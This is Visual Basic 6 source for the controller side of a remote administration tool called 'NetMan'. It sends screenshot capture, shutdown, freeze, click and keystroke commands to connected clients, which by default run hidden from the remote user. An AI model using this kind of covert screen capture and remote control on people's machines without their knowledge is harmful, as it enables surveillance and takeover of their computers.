Private Sub mnupopup_commands_show_Click(Index As Integer)
If MsgBox("Warning, this will make the NetMan client on the remote machine Visible, allowing the user to adjust settings or terminate your control over it." & vbCrLf & vbCrLf & "Are you sure you wish to proceed?", vbOKCancel, "Warning") = vbOK Then
Call popup("showclient")
End If
End Sub
Private Sub mnupopup_commands_shutdown_Click(Index As Integer)
If MsgBox("Warning, this will end the NetMan client on the remote machine before it Shutsdown, terminating your control over it.", vbOKCancel, "Warning") = vbOK Then
Call popup("shutdown")
End If
End Sub
Private Sub mnupopup_commands_unfreeze_Click(Index As Integer)
popup ("unfreeze")
End Sub
Public Function popup(command As String)

popupclick = True
Call sendcommand("", command)

End Function


Private Sub Text1_Click()
If Text1.Text = "<command> <clientname/IP>" Then
Text1.Text = ""
End If
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
Call sendcommand("", "")
End If
End Sub

Private Sub mnu_view_commands_Click()
If mnu_view_commands.Checked = False Then
frm_commands.Show
frm_commands.Left = (frm_server.Left)
frm_commands.Top = (frm_server.Top + frm_server.Height)
mnu_view_commands.Checked = True
ElseIf mnu_view_commands.Checked = True Then
Unload frm_commands
mnu_view_commands.Checked = False
End If
End Sub

Private Sub cmd_sendcommand_Click()
Call sendcommand("", "")
End Sub

Public Function sendcommand(identity As String, thecommand As String)
On Error GoTo invaliduser

Dim socketnumber As Integer

''''''''''Get the command and identity of client to send it to:
If popupclick = True Then
    command = LCase(thecommand)
    
    If List1.Visible = True Then
        identity = List1.List(List1.ListIndex)
        identity = LCase(identity)
    ElseIf List1.Visible = False Then
        identity = Left(ListView1.SelectedItem.Key, InStr(ListView1.SelectedItem.Key, "*") - 1)
        identity = LCase(identity)
    End If
        
    gotcomp = True
    popupclick = False
    
    'Prevent 2 captures from the same source from being started
    If command = "capture" Then
        If frm_mdicaptures.SearchForLoadedCapture(identity) = True Then
            result = MsgBox("You cannot capture another screenshot from " & StrConv(identity, vbProperCase) & "." & _
            vbCrLf & vbCrLf & "You already have a screenshot from this user active", vbExclamation, "Sorry...")
            Exit Function
        End If
    End If
    
ElseIf refreshed = True Then
    command = thecommand
    identity = LCase(identity)
    
    If controlling = True Then
        'this variable allows a capture to refresh during a captures Control without enabling all the other captures
        'dontstopcontrolling = True
        controlrefresh = True
    End If
    
    gotcomp = True
    refreshed = False
    capturemessage = True

'refreshed needs to be berfore controlclient so to allow it to refresh during your control or the capture
ElseIf ControlClient = True Then
    command = Left(thecommand, 6)
    identity = LCase(identity)
    
    ControlClient = False
    gotcomp = True
    controlrefresh = True
    capturemessage = True
        
ElseIf sendtoall = True Then
    command = LCase(thecommand)
    identity = LCase(identity)

    gotcomp = True
        
ElseIf popupclick = False And refreshed = False Then

    statement = LCase(Text1.Text)
    totallen = Len(statement)

    'prevent most typing errors - find a better way of doing this
    If totallen < 8 Then
    result = MsgBox("Invalid Statement", vbCritical, "Invalid Statement")
    Exit Function
    End If

    commandsplitlen = InStr(statement, " ")
    command = Left(statement, (commandsplitlen - 1))
    identity = Right(statement, (totallen - commandsplitlen))
    command = LCase(command)
    
    'set the variable controlling whether we have the computer
    'or not as negative so it will find it
    gotcomp = False
    
End If

'if it is a command NOT from a capture form then prevent if it is at the same time capturing
If popupclick = True Or sendtoall = True Or (popupclick = False And refreshed = False) Then
    
    If capturing = True Then
        result = MsgBox("You cannot send a command while one of the screenshots is refreshing.", vbexctamation, "Sorry...")
        Exit Function
        
    ElseIf autorefresh = True Then
        If Left(command, 7) = "capture" Then
        Else:
            If MsgBox("You cannot send a command while one of the screenshots is automatically refreshing." & vbCrLf & vbCrLf & _
            "Do you wish to cancel the autorefreshing?", vbYesNo, "Sorry...") = vbYes Then
                    screenshot(formnumber).Toolbar1.Buttons("stop").Enabled = False
                    stopautorefresh = True
                    autorefresh = False
                    tmr_autorefresh.Enabled = False
                    Call frm_mdicaptures.DisableOtherCaptures(False, frm_server.refreshID.caption, "auto")
            Else:
                Exit Function
            End If
        End If
    ElseIf controlling = True Then
    
        'Allow user to Refresh when controlling
        If Left(command, 7) = "capture" And refreshingduringcontrol = True Then
            refreshingduringcontrol = False
            GoTo allowcapture
        End If
        
        'if it is a capture command then stop it, otherwise let it go:
        If Left(command, 7) = "capture" Then
            If MsgBox("You cannot capture the screen of another computer while you are controlling one already." & vbCrLf & vbCrLf & _
            "Do you wish to stop controlling the other machine in order to capture from this one?", vbYesNo, "Sorry...") = vbYes Then
                controlling = False
                screenshot(formnumber).Picture3.Visible = False
                screenshot(formnumber).Picture3.MousePointer = 0
                screenshot(formnumber).Picture2.MousePointer = 0
                Call frm_mdicaptures.DisableOtherCaptures(False, screenshot(formnumber).caption, "control")
            Else:
                Exit Function
            End If
        End If
    End If
    
End If

''''''''''''Now we have the command and identity, check them:

allowcapture:
'Check if command is valid
If command = "capture" Or command = "shutdown" Or command = "logoff" Or _
command = "endclient" Or command = "freeze" Or command = "unfreeze" Or _
command = "showclient" Or command = "hideclient" Or command = "message" Or _
command = "sclick" Or command = "dclick" Or command = "rclick" Or command = "dragXY" Or _
command = "keystr" Then
    GoTo nextline
Else:
    result = MsgBox("The command is invalid", vbExclamation, "Error in processing request")
    Exit Function
End If

nextline:

'check if computer is in list
If gotcomp = False Then
    For x = 0 To List1.ListCount
        identity = LCase(identity)
        templowercase = LCase(List1.List(x))
        'if computer is in list, then:
        If templowercase = identity Then
        gotcomp = True
        End If
    Next
End If
    
'if it cannot even find it after looking in the list, return the error 'ie gotcomp still = false
If gotcomp = False Then
    result = MsgBox("The computer is not currently connected", vbExclamation, "Error in processing request")
    
    'If the computer is in the list (ie. gotcomp = true)
    'determine the socket which the computer is connected to
ElseIf gotcomp = True Then
        
    For a = 0 To sckconnectionarray.UBound
        If identity = Users(a) Then
        socketnumber = a
        Exit For
        End If
    Next

    'if the command was a message, you must get the message of user
    If command = "message" Then
        
        'if it is part of a MULTI Send where the same message is being sent to lots of clients
        If sendtoall = False Then
            Message = InputBox("Enter message to send to " & Users(socketnumber), "Type message")
        ElseIf sendtoall = True Then
            '''the message is set earlier on when you click the sendtoall button
        End If
        
        If Message = "" Then
        Exit Function
        End If
        
        command = ("message " & Message)
    End If
        
        
    'Stop user from capturing from 2 sources at once, or even from the same source twice
    If command = "capture" Then
        'lbl_Capture.caption = ("Downloading Screenshot from " & users(socketnumber))
        frm_mdicaptures.SB.Panels(3).Text = "Sending capture command to " & Users(socketnumber)
        'cmd_sendcommand.Enabled = False
        'Text1.Enabled = False
        'TemporarySuspend = True
    End If
    
    'make the command that will be sent include the coordinates"
    If command = "sclick" Or command = "dclick" Or command = "rclick" Or command = "dragXY" Or _
    command = "keystr" Then
        frm_mdicaptures.SB.Panels(3).Text = "Sending " & command & " command to " & Users(socketnumber)
        command = thecommand
    End If
        
    ''''''''send data to the computer
    sckconnectionarray(socketnumber).SendData (command)
        
    'add to log
    List4.AddItem ("Sent command: " & command & " to " & Users(socketnumber))
    Scrolllog
    'add user to username so if it is a capture the captureform can refresh knowing identity to send to
    UserName = Users(a)
    
    
    'add lastcommand to listbox7 AND then refresh the listview
    'the following code crops the command so that it is only the first half if it was a long one such as "sclick xxx:xxx" to "sclick"
    commandlen = InStr(command, " ")
    If commandlen <> 0 Then
        command = Left(command, (InStr(command, " ") - 1))
    ElseIf Left(command, 6) = "keystr" Then
        command = "keystrokes"
    End If
        
    For a = 0 To List1.ListCount - 1
        If List1.List(a) = Users(socketnumber) Then
            List7.List(a) = StrConv(command, vbProperCase)
            Call RefreshListView(-1) ' causes an error if you end a client as its place moves so send -1
        End If
    Next
        
End If

Exit Function
invaliduser:
            
            If Err.number = 40006 Then
                MsgBox ("Error: " & Err & vbCrLf & vbCrLf & "The remote client has been terminated and you can no longer connect to it")
            Else:
                MsgBox ("Error: " & Err & vbCrLf & vbCrLf & Err.Description)
            End If
            'if the client has been terminated by the user on the remote machine this can mean that it remains
            'shown on the list and causes errors, in this case, the following code will remove the client
            'lbl_Capture.caption = ""
            'cmd_sendcommand.Enabled = True
            Text1.Enabled = True
            'TemporarySuspend = False
            For a = 0 To List1.ListCount - 1
                If LCase(identity) = LCase(Users(a)) Then
                    Call sckconnectionarray_Close(CInt(a))
                    Exit For
                End If
            Next
            
End Function

Private Sub scklisten_ConnectionRequest(ByVal requestID As Long)
freesocket = findfreesocket
sckconnectionarray(freesocket).Accept (requestID)
scklisten.Close
scklisten.Listen

End Sub

Private Function findfreesocket()
Static localports As Integer

For x = 0 To sckconnectionarray.UBound
    If sckconnectionarray(x).State = sckClosed Then
        findfreesocket = x
        Exit Function
    End If
Next

Load sckconnectionarray(sckconnectionarray.UBound + 1)
localports = localports + 1
sckconnectionarray(sckconnectionarray.UBound).LocalPort = sckconnectionarray(sckconnectionarray.UBound).LocalPort + localports
findfreesocket = sckconnectionarray.UBound
    
End Function

Private Sub sckconnectionarray_Close(Index As Integer)
sckconnectionarray(Index).Close ' needed if this procedure is called from another and not initiated by the socket's closing

For x = 0 To List1.ListCount - 1
    If List1.List(x) = Users(Index) Then
        'close any captures that may be open for that computer
        If frm_mdicaptures.Visible = True Then
            Call frm_mdicaptures.CloseCapture(Users(Index), True)
        End If
        List1.RemoveItem (x)
        List2.RemoveItem (x)
        List3.RemoveItem (x)
        List5.RemoveItem (x)
        List6.RemoveItem (x)
        List7.RemoveItem (x)
        If ListView1.Visible = True Then
            ListView1.ListItems.Remove (x + 1)
            Call RefreshListView(1)
        End If
        List4.AddItem ("Connection with " & Users(Index) & " was terminated by them")
        Scrolllog
        lbl_countusers.caption = (List1.ListCount & " users currently logged on")
        Users(Index) = ""
        Exit For
    End If
Next

Call cmd_clearmulti_Click

End Sub

Private Sub RemoveClient(ClientName As String)
'''If the Client machine crashes and the Client on the remote machine is disabled, it will not register with the server until the server attempts
'''to send a command to it and Fails. What could happen is that the remote client ends on the remote machine, and then another instance of it
'''is begun on the remote machine. Because of the safety protocol in the data arrival section of the server that will not allow 2 clients of the
'''same name to connect to the server simultaneously.
'''Hence what I have programmed the server to do is close the client currently connected (crashed one) and loads the new one.
Dim FoundConnectionID As Integer
On Error GoTo errorline

FoundConnectionID = -1

For a = 0 To sckconnectionarray.UBound
    If LCase(ClientName) = LCase(Users(a)) Then
        FoundConnectionID = a
        Exit For
    End If
Next

If FoundConnectionID = -1 Then
    MsgBox ("Error, Searching for the socket that the client is connected to has failed in the RemoveClient function")
Else:
    'Make sure that the Previous client
    MissCloseAfterError = True
    sckconnectionarray(FoundConnectionID).SendData ("endclient")
    DoEvents
    MissCloseAfterError = False
    
    Call sckconnectionarray_Close(FoundConnectionID)
End If
Exit Sub

errorline:
'''There will be an error if the server attempts to send an 'endclient' command to a crashed client on the remote machine
'''This covers that possibility, and the other possibility that 2 instances of the Client could be open simultaneously on the remote machine.
    
If MissCloseAfterError = True Then          '''it failed to send the command
    MissCloseAfterError = False
    Call sckconnectionarray_Close(FoundConnectionID)
ElseIf MissCloseAfterError = False Then         '''it is another error
End If
    
End Sub

Private Sub sckconnectionarray_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim datatype As String
Dim holdmessage As String
Dim ipsplit, computernamesplit, usernamesplit, winversionsplit As String
Dim iplen, namelen, usernamelen, winversionlen As Integer
Dim totallen As Integer
Dim inter, inter2, interno As String
Dim bob As String
Dim temp, temp1 As String
Dim cut1, cut2 As String
Dim james As Image
Static thefilename, thefilenametemp As String
Dim StrMessage As String

On Error GoTo DataArrivalError

sckconnectionarray(Index).GetData holdmessage


If Left$(holdmessage, 4) = "data" Then 'computer information sent straight after the client has connected
    
    temp1 = Right(holdmessage, (Len(holdmessage) - 5))
    totallen = Len(temp1)
    
    'get computername
    namelen = InStr(temp1, " ")
    computernamesplit = Left(temp1, (namelen - 1))
    
    inter = Right(temp1, (totallen - namelen))
    
    'Get IP address
    iplen = InStr(inter, " ")
    ipsplit = Left(inter, (iplen - 1))
    
    inter2 = Right(temp1, (totallen - (namelen + iplen)))
    interno = Len(inter2)
    
    'get winversion
    winversionlen = InStr(inter2, " ")
    winversionsplit = Left(inter2, winversionlen - 1)
    
    'get username
    usernamelen = interno - winversionlen
    usernamesplit = Right(temp1, usernamelen)
    
    
    'check that computer is not already on the list, if it is you want to close it and load in this new one onto the list
    For a = 0 To (List1.ListCount - 1)
        If LCase(computernamesplit) = LCase(List1.List(a)) Then
            RemoveClient (LCase(computernamesplit))
            'Exit Sub
        End If
    Next a
    

    'add data to listboxes if the computer has not previously logged in
    List1.AddItem LCase(computernamesplit)
    List2.AddItem ipsplit
    List3.AddItem usernamesplit
    List5.AddItem Time
    List6.AddItem winversionsplit
    List7.AddItem "N/A"
    
    'add to listview dialog
    If ListView1.Visible = True Then
    Call RefreshListView(indexplace)
    End If
    
    
    statuslbl.caption = ("Listening for clients...")
    List4.AddItem ("Client connection established with:" & " " & computernamesplit)
    List4.AddItem (statuslbl.caption)
    Scrolllog
    lbl_countusers.caption = (List1.ListCount & " users currently logged on")
    
    Users(Index) = LCase(computernamesplit)
    
    If connectionalert = True Then
        Set newmsgbox = New frm_falsemsgbox
        newmsgbox.caption = Left(temp1, (InStr(temp1, " ") - 1))
        newmsgbox.Show
    End If
          
ElseIf Left$(holdmessage, 7) = "message" Then
    StrMessage = Right(holdmessage, (Len(holdmessage) - 8))
    result = MsgBox("The client " & Users(Index) & " has sent you the following message:" & vbCrLf & vbCrLf _
    & "'" & StrMessage & "'", vbOKOnly, "Message from " & Users(Index))

Else:  'captured file data


        If Left$(holdmessage, 8) = "openfile" Then
            'thefilename = (Right(holdmessage, (Len(holdmessage) - 9)))
            'thefilenametemp = "c:\temp\temp.bmp"
            FileNameTemp = (App.Path & "\temp.jpg")
            Open FileNameTemp For Binary As #3
            Close #3
            Kill FileNameTemp
            filearriving = True
            lbl_Capture.caption = "Downloading Screenshot from " & Users(Index)
            frm_mdicaptures.SB.Panels(3).Text = "Downloading Screenshot from " & Users(Index)
            TemporarySuspend = True
            cmd_sendcommand.Enabled = False
            Text1.Enabled = False
       
        ElseIf Right(holdmessage, 9) = "closefile" Then
            filearriving = False
            wholefile = wholefile & Left(holdmessage, ((Len(holdmessage)) - 9))
            If wholefile = "" Then   '''No picture (user may have been on standby when screenshot was made)
                MsgBox "The Picture captured from the remote user is Blank. This could be because the remote machine was on standby." & _
                vbCrLf & vbCrLf & "Send a capture command again to the user and it should capture a suitable screenshot", vbExclamation, "Sorry, try again..."
                Exit Sub
            End If
            Open FileNameTemp For Binary Access Write As #1
            Put #1, 1, wholefile
            Close #1
            DoEvents
            
            wholefile = ""
            holdmessage = ""
            lbl_Capture.caption = ""
            TemporarySuspend = False
            cmd_sendcommand.Enabled = True
            Text1.Enabled = True
            
            'PROCEDURE FOR SHOWING THE CAPTURE
            'Loading a NEW frm_childcapture
            If capturemessage = False Then
                
                If MsgBox("The screenshot has arrived", vbOKCancel, "Screenshot Arrived") = vbOK Then
                
                    frm_mdicaptures.Show
                    frm_mdicaptures.WindowState = 0
                    frm_mdicaptures.NewCapture FileNameTemp, Users(Index)
                    frm_mdicaptures.SB.Panels(3).Text = ""
                    DoEvents
                    'Kill filenametemp
                
                Else: Exit Sub
                End If
            
            ElseIf capturemessage = True Then
                capturemessage = False

                'A NORMAL refresh, NOT a refresh after a CONTROL event (ie. click or type)
                If controlrefresh = False Then
                    
                    If autorefresh = True Then
                    
                        If stopautorefresh = True Then
                               AutoDoEvents = False
                               stopautorefresh = False
                               autorefresh = False
                               tmr_autorefresh.Enabled = False
                               Call frm_mdicaptures.DisableOtherCaptures(False, refreshID.caption, "auto")
                               frm_mdicaptures.SB.Panels(3).Text = ""
                               Exit Sub
                        End If
                        
                        'if it is refreshing instantly after recieving a capture do this and EXIT SUB
                        If AutoDoEvents = True Then
                            frm_mdicaptures.RefreshForm refreshID.caption, FileNameTemp
                            frm_mdicaptures.SB.Panels(3).Text = ""
                            'Kill filenametemp
                            tmr_autorefresh.Enabled = False
                            frm_mdicaptures.Refresh (refreshID.caption)
                            Exit Sub
                        End If
                        
                     'If it is a normal AutoRefresh (on a timer)
                    frm_mdicaptures.RefreshForm refreshID.caption, FileNameTemp
                    frm_mdicaptures.SB.Panels(3).Text = ""
                    'Kill filenametemp
                    tmr_autorefresh.Enabled = True
                    
                    'If it was a simple SINGLE REFRESH
                    ElseIf autorefresh = False Then
                        
                        If afterautostop = True Then
                            frm_mdicaptures.SB.Panels(3).Text = ""
                            afterautostop = False
                            Exit Sub
                        Else:
                            frm_mdicaptures.RefreshForm refreshID.caption, FileNameTemp
                            frm_mdicaptures.SB.Panels(3).Text = ""
                            'Kill filenametemp
                            Call frm_mdicaptures.DisableOtherCaptures(False, refreshID.caption, "refresh")
                        End If
                    
                    End If
                
                'If it IS a refresh after a CONTROL event (ie. click or type)
                ElseIf controlrefresh = True Then
                    'controlrefresh = False
                    frm_mdicaptures.RefreshForm refreshID.caption, FileNameTemp
                    frm_mdicaptures.SB.Panels(3).Text = ""
                    'If controlling = True Then
                    '    Call frm_mdicaptures.DisableOtherCaptures(False, refreshID.caption, "refresh")
                    'End If
                    'DoEvents
                    'Kill filenametemp
                End If
                
            End If
            
        ElseIf filearriving = True Then
        wholefile = (wholefile & holdmessage)

        End If

End If

Exit Sub

DataArrivalError:
    MsgBox (Err.Description)

End Sub

Private Sub tmr_autorefresh_Timer()
frm_mdicaptures.Refresh (refreshID.caption)
End Sub

Private Function Scrolllog()

If List4.ListCount = -1 Then
Exit Function
Else:
List4.Selected(List4.ListCount - 1) = True
End If

End Function

Private Sub tmr_bar_Timer()
moving.Top = moving.Top + ((6855 / 100))
If moving.Top = 4506 Then
    moving.Top = -2325
    tmr_bar2.Enabled = True
    tmr_bar.Enabled = False
End If
End Sub

Private Sub tmr_bar2_Timer()
tmr_bar.Enabled = True
tmr_bar2.Enabled = False
End Sub
